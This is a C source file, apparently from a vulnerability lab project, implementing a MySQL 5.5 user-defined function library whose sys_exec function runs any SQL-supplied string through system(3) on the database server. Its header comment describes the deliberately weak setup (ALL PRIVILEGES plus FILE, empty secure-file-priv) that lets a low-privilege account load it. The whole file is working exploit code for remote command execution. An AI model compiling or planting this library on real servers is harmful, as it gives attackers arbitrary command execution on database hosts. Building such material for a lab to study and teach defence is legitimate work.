/*
 * lib_mysqludf_sys.c - PoC for MySQL 5.5 UDF RCE.
 *
 * Exposes sys_exec(cmd) which runs cmd through system(3) and returns
 * the exit status. Intended for the vulnerability lab in this project
 * only: the database account osede_app has ALL PRIVILEGES + FILE and
 * mysqld runs with an empty secure-file-priv, so a low-privilege app
 * account can load arbitrary .so files into the server.
 *
 * Self-contained on purpose: the vendored MySQL 5.5 headers do not
 * ship the udf_* function pointer typedefs, so the 5.5 ABI structs
 * are redeclared here (they must match mysql_com.h exactly).
 */

#include <stdlib.h>

typedef char my_bool;

typedef struct st_udf_args
{
  unsigned int arg_count;
  unsigned char *arg_type;
  char **args;
  unsigned long *lengths;
  char *maybe_null;
  char **attributes;
  unsigned long *attribute_lengths;
  void *extension;
} UDF_ARGS;

typedef struct st_udf_init
{
  my_bool maybe_null;
  unsigned int decimals;
  unsigned long max_length;
  char *ptr;
  my_bool const_item;
  void *extension;
} UDF_INIT;

int sys_exec_init(UDF_INIT *init, UDF_ARGS *args, char *message);
void sys_exec_deinit(UDF_INIT *init);
long long sys_exec(UDF_INIT *init, UDF_ARGS *args, char *is_null, char *error);

int sys_exec_init(UDF_INIT *init, UDF_ARGS *args, char *message)
{
  (void)args;
  (void)message;
  init->const_item = 0;
  init->maybe_null = 0;
  return 0;
}

void sys_exec_deinit(UDF_INIT *init)
{
  (void)init;
}

long long sys_exec(UDF_INIT *init, UDF_ARGS *args, char *is_null, char *error)
{
  (void)init;
  if (args->arg_count < 1 || args->lengths[0] == 0)
  {
    *error = 1;
    return 0;
  }
  *is_null = 0;
  return (long long)system((const char *)args->args[0]);
}
